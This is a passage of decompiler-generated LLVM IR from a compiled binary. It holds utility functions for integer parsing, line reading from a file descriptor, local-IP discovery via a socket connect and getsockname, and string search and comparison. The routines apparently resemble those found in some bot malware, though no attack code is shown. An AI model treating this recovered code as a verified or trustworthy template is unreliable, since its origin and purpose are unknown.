  %v0_13ad4 = phi i32 [ %tmp, %dec_label_pc_13ac8 ], [ %v5_13ad4, %bb ], [ %v5_13ad4, %dec_label_pc_13aec ], [ %v5_13ad4, %.thread ]
  %v1_13ad4 = inttoptr i32 %v0_13ad4 to i8*
  %v2_13ad4 = load i8, i8* %v1_13ad4, align 1
  %v5_13ad4 = add i32 %v0_13ad4, 1
  %v7_13adc = icmp eq i8 %v2_13ad4, 9
  br i1 %v7_13adc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13ad4
  br label %dec_label_pc_13ad4

bb:                                               ; preds = %dec_label_pc_13ad4
  %v8_13ae0 = icmp eq i8 %v2_13ad4, 32
  br i1 %v8_13ae0, label %dec_label_pc_13ad4, label %dec_label_pc_13aec

dec_label_pc_13aec:                               ; preds = %bb
  %v7_13aec = icmp eq i8 %v2_13ad4, 10
  br i1 %v7_13aec, label %dec_label_pc_13ad4, label %dec_label_pc_13af4

dec_label_pc_13af4:                               ; preds = %dec_label_pc_13aec
  %v7_13af4 = icmp eq i8 %v2_13ad4, 45
  br i1 %v7_13af4, label %dec_label_pc_13bd4, label %dec_label_pc_13afc

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13af4
  %v7_13afc = icmp eq i8 %v2_13ad4, 43
  br i1 %v7_13afc, label %bb54, label %dec_label_pc_13b0c

bb54:                                             ; preds = %dec_label_pc_13afc
  %v2_13b00 = inttoptr i32 %v5_13ad4 to i8*
  %v3_13b00 = load i8, i8* %v2_13b00, align 1
  %v6_13b00 = add i32 %v0_13ad4, 2
  br label %dec_label_pc_13b0c

dec_label_pc_13b0c:                               ; preds = %bb54, %dec_label_pc_13afc, %dec_label_pc_13bd4
  %v0_13bb842 = phi i32 [ %v5_13bd4, %dec_label_pc_13bd4 ], [ %v5_13ad4, %dec_label_pc_13afc ], [ %v6_13b00, %bb54 ]
  %v0_13b3417.in = phi i8 [ %v2_13bd4, %dec_label_pc_13bd4 ], [ %v2_13ad4, %dec_label_pc_13afc ], [ %v3_13b00, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_13bd4 ], [ 2147483647, %dec_label_pc_13afc ], [ 2147483647, %bb54 ]
  %v0_13be4 = phi i32 [ 1, %dec_label_pc_13bd4 ], [ 0, %dec_label_pc_13afc ], [ 0, %bb54 ]
  %v2_13b14 = urem i32 %storemerge1, %arg2
  %v2_13b24 = udiv i32 %storemerge1, %arg2
  store i32 %v2_13b24, i32* @lr, align 4
  br label %dec_label_pc_13b34

dec_label_pc_13b34:                               ; preds = %.thread8, %dec_label_pc_13b0c
  %v0_13bb8 = phi i32 [ %v5_13bb8, %.thread8 ], [ %v0_13bb842, %dec_label_pc_13b0c ]
  %v2_13bb011 = phi i32 [ %v1_13bcc29, %.thread8 ], [ 0, %dec_label_pc_13b0c ]
  %v1_13b8c = phi i32 [ %v0_13bc027, %.thread8 ], [ 0, %dec_label_pc_13b0c ]
  %v1_13b74.in = phi i8 [ %v2_13bb8, %.thread8 ], [ %v0_13b3417.in, %dec_label_pc_13b0c ]
  %v1_13b74 = zext i8 %v1_13b74.in to i32
  %v1_13b34 = urem i32 %v1_13b74, 256
  %v1_13b38 = add nsw i32 %v1_13b34, -48
  %v1_13b40 = add nsw i32 %v1_13b34, -97
  %v1_13b44 = add nsw i32 %v1_13b74, -48
  %v1_13b48 = add nsw i32 %v1_13b34, -65
  %tmp77 = icmp ult i32 %v1_13b38, 10
  br i1 %tmp77, label %dec_label_pc_13b78, label %dec_label_pc_13b50

dec_label_pc_13b50:                               ; preds = %dec_label_pc_13b34
  %v2_13b50 = icmp ugt i32 %v1_13b48, 24
  %v7_13b50 = icmp eq i32 %v1_13b48, 25
  %v2_13b54 = xor i1 %v7_13b50, true
  %v3_13b54 = and i1 %v2_13b50, %v2_13b54
  br i1 %v3_13b54, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_13b50
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_13b50, %bb55
  %v0_13b6821 = phi i32 [ %v1_13b44, %dec_label_pc_13b50 ], [ 0, %bb55 ]
  %v2_13b58 = xor i1 %v2_13b50, true
  %v3_13b58 = or i1 %v7_13b50, %v2_13b58
  br i1 %v3_13b58, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_13b68 = phi i32 [ %v0_13b6821, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_13b54, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_13b60 = icmp ugt i32 %v1_13b40, 24
  %v11_13b60 = icmp eq i32 %v1_13b40, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_13b64 = phi i1 [ %v7_13b50, %bb58 ], [ %v11_13b60, %bb59 ]
  %v0_13b64 = phi i1 [ %v2_13b50, %bb58 ], [ %v6_13b60, %bb59 ]
  %v2_13b64 = xor i1 %v1_13b64, true
  %v3_13b64 = and i1 %v0_13b64, %v2_13b64
  br i1 %v3_13b64, label %dec_label_pc_13bc0, label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %bb60
  %v2_13b68 = icmp eq i32 %v0_13b68, 0
  %. = select i1 %v2_13b68, i32 87, i32 55
  %v2_13b74 = sub nsw i32 %v1_13b74, %.
  br label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b34, %dec_label_pc_13b68
  %v0_13b8c37 = phi i32 [ %v1_13b48, %dec_label_pc_13b34 ], [ %., %dec_label_pc_13b68 ]
  %v3_13bb012 = phi i32 [ %v1_13b44, %dec_label_pc_13b34 ], [ %v2_13b74, %dec_label_pc_13b68 ]
  %v6_13b7c = icmp slt i32 %v3_13bb012, %arg2
  br i1 %v6_13b7c, label %dec_label_pc_13b80, label %dec_label_pc_13bc0

dec_label_pc_13b80:                               ; preds = %dec_label_pc_13b78
  %v3_13b80 = icmp uge i32 %v2_13bb011, %v2_13b24
  %v9_13b80 = icmp eq i32 %v2_13bb011, %v2_13b24
  %v2_13b84 = xor i1 %v3_13b80, true
  %v3_13b84 = or i1 %v9_13b80, %v2_13b84
  br i1 %v3_13b84, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_13b80
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_13b80, %bb63
  %v0_13b8c36 = phi i32 [ %v0_13b8c37, %dec_label_pc_13b80 ], [ 0, %bb63 ]
  %v2_13b88 = xor i1 %v9_13b80, true
  %v3_13b88 = and i1 %v3_13b80, %v2_13b88
  br i1 %v3_13b88, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_13b8c = phi i32 [ %v0_13b8c36, %bb64 ], [ 1, %bb65 ]
  %tmp78 = icmp slt i32 %v1_13b8c, 0
  %v4_13b8c = zext i1 %tmp78 to i32
  %v5_13b8c = or i32 %v0_13b8c, %v4_13b8c
  %v7_13b8c = icmp eq i32 %v5_13b8c, 0
  br i1 %v7_13b8c, label %dec_label_pc_13b98, label %.thread8

dec_label_pc_13b98:                               ; preds = %bb66
  %v7_13ba8 = icmp sgt i32 %v3_13bb012, %v2_13b14
  br i1 %v7_13ba8, label %bb69, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_13b98
  br label %bb70

bb69:                                             ; preds = %dec_label_pc_13b98
  %v2_13bac = icmp eq i1 %v9_13b80, false
  br i1 %v2_13bac, label %bb70, label %.thread8

bb70:                                             ; preds = %bb69, %.thread5
  %v4_13bb013 = mul i32 %v2_13bb011, %arg2
  %v5_13bb014 = add i32 %v3_13bb012, %v4_13bb013
  br label %.thread8

.thread8:                                         ; preds = %bb69, %bb66, %bb70
  %v1_13bcc29 = phi i32 [ %v2_13bb011, %bb69 ], [ %v2_13bb011, %bb66 ], [ %v5_13bb014, %bb70 ]
  %v0_13bc027 = phi i32 [ -1, %bb69 ], [ -1, %bb66 ], [ 1, %bb70 ]
  %v1_13bb8 = inttoptr i32 %v0_13bb8 to i8*
  %v2_13bb8 = load i8, i8* %v1_13bb8, align 1
  %v5_13bb8 = add i32 %v0_13bb8, 1
  br label %dec_label_pc_13b34

dec_label_pc_13bc0:                               ; preds = %dec_label_pc_13b78, %bb60
  %v1_13bc0 = icmp slt i32 %v1_13b8c, 0
  %v2_13be4 = icmp eq i32 %v0_13be4, 0
  br i1 %v1_13bc0, label %dec_label_pc_13be4, label %dec_label_pc_13bc8

dec_label_pc_13bc8:                               ; preds = %dec_label_pc_13bc0
  br i1 %v2_13be4, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_13bc8
  %v2_13bcc = sub i32 0, %v2_13bb011
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_13bc8, %bb71
  %v23_13bd0 = phi i32 [ %v2_13bb011, %dec_label_pc_13bc8 ], [ %v2_13bcc, %bb71 ]
  ret i32 %v23_13bd0

dec_label_pc_13bd4:                               ; preds = %dec_label_pc_13af4
  %v1_13bd4 = inttoptr i32 %v5_13ad4 to i8*
  %v2_13bd4 = load i8, i8* %v1_13bd4, align 1
  %v5_13bd4 = add i32 %v0_13ad4, 2
  br label %dec_label_pc_13b0c

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bc0
  %.76 = select i1 %v2_13be4, i32 2147483647, i32 -2147483648
  ret i32 %.76

; uselistorder directives
  uselistorder i1 %v9_13b80, { 1, 0, 2 }
  uselistorder i1 %v3_13b80, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_13b50, { 1, 2, 0 }
  uselistorder i1 %v2_13b50, { 1, 0, 2 }
  uselistorder i32 %v1_13b34, { 1, 2, 0 }
  uselistorder i32 %v1_13b74, { 1, 0, 2 }
  uselistorder i32 %v1_13b8c, { 1, 0 }
  uselistorder i32 %v2_13bb011, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_13bb8, { 1, 0 }
  uselistorder i32 %v2_13b24, { 1, 0, 2 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v5_13ad4, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_13ad4, { 0, 1, 3, 2 }
  uselistorder i32 25, { 24, 25, 12, 3, 0, 4, 13, 5, 14, 6, 15, 11, 16, 17, 18, 1, 19, 7, 20, 2, 21, 8, 9, 22, 10, 23, 26, 27 }
  uselistorder i32 24, { 32, 33, 35, 12, 11, 74, 41, 75, 42, 57, 36, 13, 37, 14, 38, 15, 39, 40, 60, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 61, 56, 62, 58, 59, 76, 77, 78, 63, 79, 0, 64, 16, 1, 65, 17, 18, 2, 66, 19, 67, 20, 3, 21, 22, 4, 23, 5, 6, 7, 24, 8, 68, 25, 69, 70, 71, 26, 27, 9, 72, 28, 73, 29, 80, 81, 82, 83, 84, 30, 85, 10, 34, 31, 86 }
  uselistorder i8 32, { 7, 13, 8, 9, 0, 10, 11, 12, 1, 2, 3, 4, 5, 6, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 9, { 5, 6, 7, 8, 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_13b78, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_13b0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ad4, { 1, 2, 0, 3 }
}

define i32 @function_13bf4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13bf4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13bf4 = load i32, i32* @r4, align 4
  store i32 %v3_13bf4, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c0c

dec_label_pc_13c0c:                               ; preds = %dec_label_pc_13c38.dec_label_pc_13c0c_crit_edge, %dec_label_pc_13bf4
  %v0_13c10 = phi i32 [ %v0_13c10.pre, %dec_label_pc_13c38.dec_label_pc_13c0c_crit_edge ], [ %arg3, %dec_label_pc_13bf4 ]
  %v0_13c0c = phi i32 [ %v1_13c24, %dec_label_pc_13c38.dec_label_pc_13c0c_crit_edge ], [ %tmp, %dec_label_pc_13bf4 ]
  %v3_13c18 = inttoptr i32 %v0_13c0c to i32*
  %v4_13c18 = call i32 @read(i32 %v0_13c10, i32* %v3_13c18, i32 1)
  %v7_13c1c = icmp eq i32 %v4_13c18, 1
  %v0_13c20 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c24 = add i32 %v0_13c20, 1
  store i32 %v1_13c24, i32* %r4.global-to-local, align 4
  %v0_13c2c = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_13c1c, label %dec_label_pc_13c2c, label %dec_label_pc_13c44

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13c0c
  %v1_13c2c = add i32 %v0_13c2c, 1
  store i32 %v1_13c2c, i32* %r5.global-to-local, align 4
  %v0_13c30 = load i32, i32* %r7.global-to-local, align 4
  %v7_13c34 = icmp sgt i32 %v0_13c30, %v1_13c2c
  br i1 %v7_13c34, label %dec_label_pc_13c38, label %dec_label_pc_13c44

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13c2c
  %v1_13c38 = inttoptr i32 %v0_13c20 to i8*
  %v2_13c38 = load i8, i8* %v1_13c38, align 1
  %v7_13c3c = icmp eq i8 %v2_13c38, 10
  br i1 %v7_13c3c, label %dec_label_pc_13c44, label %dec_label_pc_13c38.dec_label_pc_13c0c_crit_edge

dec_label_pc_13c38.dec_label_pc_13c0c_crit_edge:  ; preds = %dec_label_pc_13c38
  %v0_13c10.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c0c

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c0c, %dec_label_pc_13c38, %dec_label_pc_13c2c
  %v0_13c44 = phi i32 [ %v1_13c2c, %dec_label_pc_13c38 ], [ %v1_13c2c, %dec_label_pc_13c2c ], [ %v0_13c2c, %dec_label_pc_13c0c ]
  %v2_13c44 = icmp eq i32 %v0_13c44, 0
  %v1_13c48 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_13c44, i32 0, i32 %v1_13c48
  %v2_13c50 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13c50, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_13c24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i8 10, { 7, 1, 0, 8, 9, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @read, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_13c44, { 1, 2, 0 }
}

define i32 @function_13c54() local_unnamed_addr {
dec_label_pc_13c54:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_13c64 = call i32* @__errno_location()
  store i32 0, i32* %v0_13c64, align 4
  %v3_13c7c = call i32 @socket(i32 2, i32 0, i32 0)
  %v7_13c88 = icmp eq i32 %v3_13c7c, -1
  store i32 %v3_13c7c, i32* %r5.global-to-local, align 4
  %v2_13c94 = load i32, i32* %r4.global-to-local, align 4
  br i1 %v7_13c88, label %dec_label_pc_13ce4, label %dec_label_pc_13ca8

dec_label_pc_13ca8:                               ; preds = %dec_label_pc_13c54
  %v7_13c94 = shl i32 2056, %v2_13c94
  %v8_13c94 = or i32 %v7_13c94, 2056
  %v2_13c5c = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v3_13cc4 = call i32 @_connect(i32 %v3_13c7c, i32 %v2_13c5c, i32 %v2_13c94)
  %tmp13 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v0_13cd0 = load i32, i32* %r5.global-to-local, align 4
  %v6_13cd4 = call i32 @getsockname(i32 %v0_13cd0, %sockaddr* %tmp13, i32* nonnull %stack_var_-24)
  %v1_13cdc = call i32 @close(i32 %v0_13cd0)
  br label %dec_label_pc_13ce4

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13c54, %dec_label_pc_13ca8
  %v0_13ce4 = phi i32 [ 0, %dec_label_pc_13c54 ], [ %v8_13c94, %dec_label_pc_13ca8 ]
  ret i32 %v0_13ce4

; uselistorder directives
  uselistorder i32 %v3_13c7c, { 1, 2, 0 }
  uselistorder i32 (i32)* @close, { 19, 3, 2, 18, 17, 1, 0, 16, 15, 32, 21, 20, 31, 30, 29, 33, 35, 34, 24, 23, 22, 38, 37, 14, 36, 7, 6, 5, 4, 11, 10, 9, 8, 13, 12, 28, 27, 26, 25, 39 }
  uselistorder i32 (i32, i32, i32)* @_connect, { 2, 8, 1, 6, 7, 5, 4, 3, 0 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 3, 8, 1, 4, 17, 18, 13, 0, 14, 10, 11, 15, 9, 7, 12, 2, 16, 6, 5, 19 }
  uselistorder i32* ()* @__errno_location, { 6, 3, 4, 5, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_13ce4, { 1, 0 }
}

define i32 @function_13cf0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13cf0:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_13cf4 = load i8, i8* %tmp, align 1
  %v2_13cf8 = icmp eq i8 %v3_13cf4, 0
  br i1 %v2_13cf8, label %bb, label %dec_label_pc_13d0c

bb:                                               ; preds = %dec_label_pc_13cf0
  %v4_13cf4 = zext i8 %v3_13cf4 to i32
  br label %dec_label_pc_13d20

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13cf0
  br label %dec_label_pc_13d10

dec_label_pc_13d10:                               ; preds = %dec_label_pc_13d10, %dec_label_pc_13d0c
  %v0_13d10 = phi i32 [ %v1_13d10, %dec_label_pc_13d10 ], [ 0, %dec_label_pc_13d0c ]
  %v1_13d10 = add i32 %v0_13d10, 1
  %v2_13d14 = add i32 %v1_13d10, %arg2
  %v3_13d14 = inttoptr i32 %v2_13d14 to i8*
  %v4_13d14 = load i8, i8* %v3_13d14, align 1
  %v2_13d18 = icmp eq i8 %v4_13d14, 0
  br i1 %v2_13d18, label %dec_label_pc_13d20, label %dec_label_pc_13d10

dec_label_pc_13d20:                               ; preds = %dec_label_pc_13d10, %bb
  %v0_13d6418 = phi i32 [ %v4_13cf4, %bb ], [ %v1_13d10, %dec_label_pc_13d10 ]
  %v0_13d281 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_13d281, 1
  br i1 %tmp27, label %dec_label_pc_13d74, label %dec_label_pc_13d34

dec_label_pc_13d34:                               ; preds = %dec_label_pc_13d20, %dec_label_pc_13d28.backedge
  %v0_13d2c.in = phi i32 [ %v0_13d2c, %dec_label_pc_13d28.backedge ], [ %v0_13d281, %dec_label_pc_13d20 ]
  %v0_13d58 = phi i32 [ %v1_13d58., %dec_label_pc_13d28.backedge ], [ 0, %dec_label_pc_13d20 ]
  %v0_13d34 = phi i32 [ %v5_13d34, %dec_label_pc_13d28.backedge ], [ %tmp20, %dec_label_pc_13d20 ]
  %v0_13d2c = add i32 %v0_13d2c.in, -1
  %v1_13d34 = inttoptr i32 %v0_13d34 to i8*
  %v2_13d34 = load i8, i8* %v1_13d34, align 1
  %v3_13d34 = zext i8 %v2_13d34 to i32
  %v5_13d34 = add i32 %v0_13d34, 1
  %v2_13d38 = add i32 %v0_13d58, %arg2
  %v3_13d38 = inttoptr i32 %v2_13d38 to i8*
  %v4_13d38 = load i8, i8* %v3_13d38, align 1
  %v6_13d38 = zext i8 %v4_13d38 to i32
  %v1_13d3c = add nsw i32 %v3_13d34, -65
  %v1_13d40 = add nsw i32 %v6_13d38, -65
  %tmp35 = icmp ult i32 %v1_13d3c, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_13d34
  %v5_13d48 = or i32 %v3_13d34, 96
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_13d34, %bb28
  %v0_13d54 = phi i32 [ %v3_13d34, %dec_label_pc_13d34 ], [ %v5_13d48, %bb28 ]
  %tmp36 = icmp ult i32 %v1_13d40, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_13d50 = or i32 %v6_13d38, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_13d54 = phi i32 [ %v6_13d38, %bb29 ], [ %v5_13d50, %bb30 ]
  %v9_13d54 = icmp eq i32 %v0_13d54, %v1_13d54
  %v1_13d58 = add i32 %v0_13d58, 1
  %v1_13d58. = select i1 %v9_13d54, i32 %v1_13d58, i32 0
  br i1 %v9_13d54, label %dec_label_pc_13d64, label %dec_label_pc_13d28.backedge

dec_label_pc_13d28.backedge:                      ; preds = %bb31, %dec_label_pc_13d64
  %tmp32 = icmp slt i32 %v0_13d2c, 1
  br i1 %tmp32, label %dec_label_pc_13d74, label %dec_label_pc_13d34

dec_label_pc_13d64:                               ; preds = %bb31
  %v9_13d64 = icmp eq i32 %v0_13d6418, %v1_13d58.
  br i1 %v9_13d64, label %dec_label_pc_13d6c, label %dec_label_pc_13d28.backedge

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d64
  %v2_13d6c = sub i32 %v5_13d34, %tmp20
  ret i32 %v2_13d6c

dec_label_pc_13d74:                               ; preds = %dec_label_pc_13d28.backedge, %dec_label_pc_13d20
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_13d58., { 1, 0 }
  uselistorder i32 %v0_13d34, { 1, 0 }
  uselistorder i32 %v0_13d58, { 1, 0 }
  uselistorder i8 %v3_13cf4, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder i32* @r1, { 1, 29, 30, 28, 23, 2, 4, 5, 6, 26, 27, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 3 }
  uselistorder label %dec_label_pc_13d28.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_13d34, { 1, 0 }
}

define i32 @function_13d7c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13d7c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13d7c = load i8, i8* %arg1, align 1
  %v2_13d80 = icmp eq i8 %v2_13d7c, 0
  br i1 %v2_13d80, label %bb, label %dec_label_pc_13d8c

bb:                                               ; preds = %dec_label_pc_13d7c
  %v3_13d7c = zext i8 %v2_13d7c to i32
  br label %dec_label_pc_13da0

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13d7c
  br label %dec_label_pc_13d90

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d90, %dec_label_pc_13d8c
  %v0_13d90 = phi i32 [ %v1_13d90, %dec_label_pc_13d90 ], [ 0, %dec_label_pc_13d8c ]
  %v1_13d90 = add i32 %v0_13d90, 1
  %v2_13d94 = add i32 %v1_13d90, %tmp
  %v3_13d94 = inttoptr i32 %v2_13d94 to i8*
  %v4_13d94 = load i8, i8* %v3_13d94, align 1
  %v2_13d98 = icmp eq i8 %v4_13d94, 0
  br i1 %v2_13d98, label %dec_label_pc_13da0, label %dec_label_pc_13d90

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d90, %bb
  %v1_13dc4 = phi i32 [ %v3_13d7c, %bb ], [ %v1_13d90, %dec_label_pc_13d90 ]
  %v1_13da0 = inttoptr i32 %arg2 to i8*
  %v2_13da0 = load i8, i8* %v1_13da0, align 1
  %v2_13da4 = icmp eq i8 %v2_13da0, 0
  br i1 %v2_13da4, label %bb22, label %dec_label_pc_13db0

bb22:                                             ; preds = %dec_label_pc_13da0
  %v3_13da0 = zext i8 %v2_13da0 to i32
  br label %dec_label_pc_13dc4

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13da0
  br label %dec_label_pc_13db4

dec_label_pc_13db4:                               ; preds = %dec_label_pc_13db4, %dec_label_pc_13db0
  %v0_13db4 = phi i32 [ %v1_13db4, %dec_label_pc_13db4 ], [ 0, %dec_label_pc_13db0 ]
  %v1_13db4 = add i32 %v0_13db4, 1
  %v2_13db8 = add i32 %v1_13db4, %arg2
  %v3_13db8 = inttoptr i32 %v2_13db8 to i8*
  %v4_13db8 = load i8, i8* %v3_13db8, align 1
  %v2_13dbc = icmp eq i8 %v4_13db8, 0
  br i1 %v2_13dbc, label %dec_label_pc_13dc4, label %dec_label_pc_13db4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13db4, %bb22
  %v0_13df04 = phi i32 [ %v3_13da0, %bb22 ], [ %v1_13db4, %dec_label_pc_13db4 ]
  %v9_13dc4 = icmp eq i32 %v0_13df04, %v1_13dc4
  br i1 %v9_13dc4, label %dec_label_pc_13df0.preheader, label %dec_label_pc_13dd0

dec_label_pc_13df0.preheader:                     ; preds = %dec_label_pc_13dc4
  %v2_13df06 = icmp eq i32 %v1_13dc4, 0
  br i1 %v2_13df06, label %dec_label_pc_13df8, label %dec_label_pc_13dd8

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13dd8, %dec_label_pc_13dc4
  ret i32 0

dec_label_pc_13dd8:                               ; preds = %dec_label_pc_13de8, %dec_label_pc_13df0.preheader
  %v0_13df0.in = phi i32 [ %v0_13df0, %dec_label_pc_13de8 ], [ %v1_13dc4, %dec_label_pc_13df0.preheader ]
  %v0_13dec = phi i32 [ %v1_13dec, %dec_label_pc_13de8 ], [ %arg2, %dec_label_pc_13df0.preheader ]
  %v0_13de8 = phi i32 [ %v1_13de8, %dec_label_pc_13de8 ], [ %tmp, %dec_label_pc_13df0.preheader ]
  %v0_13df0 = add i32 %v0_13df0.in, -1
  %v1_13dd8 = inttoptr i32 %v0_13de8 to i8*
  %v2_13dd8 = load i8, i8* %v1_13dd8, align 1
  %v1_13ddc = inttoptr i32 %v0_13dec to i8*
  %v2_13ddc = load i8, i8* %v1_13ddc, align 1
  %v9_13de0 = icmp eq i8 %v2_13dd8, %v2_13ddc
  br i1 %v9_13de0, label %dec_label_pc_13de8, label %dec_label_pc_13dd0

dec_label_pc_13de8:                               ; preds = %dec_label_pc_13dd8
  %v1_13de8 = add i32 %v0_13de8, 1
  %v1_13dec = add i32 %v0_13dec, 1
  %v2_13df0 = icmp eq i32 %v0_13df0, 0
  br i1 %v2_13df0, label %dec_label_pc_13df8, label %dec_label_pc_13dd8

dec_label_pc_13df8:                               ; preds = %dec_label_pc_13de8, %dec_label_pc_13df0.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_13da0, { 1, 0 }
  uselistorder i8 %v2_13d7c, { 1, 0 }
}

define i32 @function_13e00(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13e00:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13e04 = load i8, i8* %arg1, align 1
  %v2_13e08 = icmp eq i8 %v2_13e04, 0
  %v0_13e0c = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_13e08, label %bb, label %dec_label_pc_13e18

bb:                                               ; preds = %dec_label_pc_13e00
  %v3_13e04 = zext i8 %v2_13e04 to i32
  br label %dec_label_pc_13e2c

dec_label_pc_13e18:                               ; preds = %dec_label_pc_13e00
  br label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e1c, %dec_label_pc_13e18
  %v0_13e1c = phi i32 [ %v1_13e1c, %dec_label_pc_13e1c ], [ 0, %dec_label_pc_13e18 ]
  %v1_13e1c = add i32 %v0_13e1c, 1
  %v2_13e20 = add i32 %v1_13e1c, %tmp
  %v3_13e20 = inttoptr i32 %v2_13e20 to i8*
  %v4_13e20 = load i8, i8* %v3_13e20, align 1
  %v2_13e24 = icmp eq i8 %v4_13e20, 0
  br i1 %v2_13e24, label %dec_label_pc_13e2c, label %dec_label_pc_13e1c

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e1c, %bb
  %v9_13e54 = phi i32 [ %v3_13e04, %bb ], [ %v1_13e1c, %dec_label_pc_13e1c ]
  %v0_13e2c = load i32, i32* %r1.global-to-local, align 4
  %v1_13e2c = inttoptr i32 %v0_13e2c to i8*
  %v2_13e2c = load i8, i8* %v1_13e2c, align 1
  %v3_13e2c = zext i8 %v2_13e2c to i32
